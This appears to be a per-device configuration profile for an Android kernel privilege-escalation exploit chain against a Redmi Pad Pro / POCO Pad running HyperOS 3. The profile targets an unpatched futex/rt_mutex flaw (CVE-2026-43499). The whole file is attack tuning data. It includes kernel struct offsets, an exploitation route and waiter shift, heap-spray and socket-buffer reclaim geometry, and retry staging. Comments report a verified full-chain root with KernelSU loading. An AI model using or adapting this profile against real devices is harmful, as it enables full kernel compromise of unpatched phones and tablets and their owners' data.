# Redmi Pad Pro / POCO Pad (dizi, parrot/SM4xx) HyperOS 3 OS3.0.307.0.WNSCNXM;
# Android 16, patch 2026-08-01. Device-gate verified (DIZI-01, 2026-10-09:
# 2 consecutive cold-boot full-chain PASS, KernelSU late-load confirmed).
# Source: official OTA boot.img (CVE-2026-43499 primitive present,
# remove_waiter@0x1ecc18 unpatched). boot.img has no embedded BTF; struct
# offsets come from the GKI vmlinux DWARF of the same build (ci.android.com
# build 14313284, kernel/common fb24cf99ad97 matching uname) and were
# cross-validated against the device image (init_task.comm="swapper",
# init_cred caps run at 0x30..0x40). kernel_phys_load from the uefi memory map.
# multicast_waiter is geometrically infeasible on this kernel (derived
# waiter_off=0x150 exceeds the fixed 0x108 group_source_req copy window), so
# this profile uses select_stack; waiter_shift derived by static chain-frame
# analysis (pselect __arm64_sys_pselect6->core_sys_select vs futex
# __arm64_sys_futex->do_futex->futex_wait_requeue_pi, waiter local sp+0x90,
# fd_set buffer sp+0x50, delta 0 -> shift 0 -> waiter_shift -2).
# 5.10 rt_mutex_waiter has no wake_state: prio lives at +0x40 and reads the
# stamped wake_state slot (0/3) instead of 140; single-waiter audit shows the
# waiter_equal gate still fires the requeue erase (device gate decides).
release = "5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284"
schema_version = 1
kernel_major = 5
recommend_shizuku = 1
kernel_phys_load = 2818572288
kernel_phys_offset = null
route {
  select_stack {
    waiter_shift = -2
    compact_waiter = 1
  }
}
fallback {
  to = "none"
}
# Two-phase gate: W2 runs in a fresh process after the W1-only pass, so a
# failed attempt exits cleanly and the outer loop re-runs instead of retrying
# on a dirty heap until a walk panics and costs a reboot.
execution {
  stages {
    w2_attempts = 1
  }
}
kernelsnitch {
  collisions = 8
  # dizi SLUB is 64B-cacheline: DWARF sizeof(mm_struct)=952 rounds to 960
  # (/proc/slabinfo: objsize=960 objperslab=34 pagesperslab=8). This field is
  # the slab-object stride for scanning and spray step, not sizeof.
  mm_struct_sz = 960
  # Reclaim geometry (device-gate calibrated): 5.10 unix sendmsg allocates a
  # 4KB kmalloc header + order-3 full-page frag with data at page offset 0, so
  # stream byte 4096 is the block start; sends=16 fills the window reliably.
  skb_reclaim_sends = 16
  skb_frag_bias = 384
}
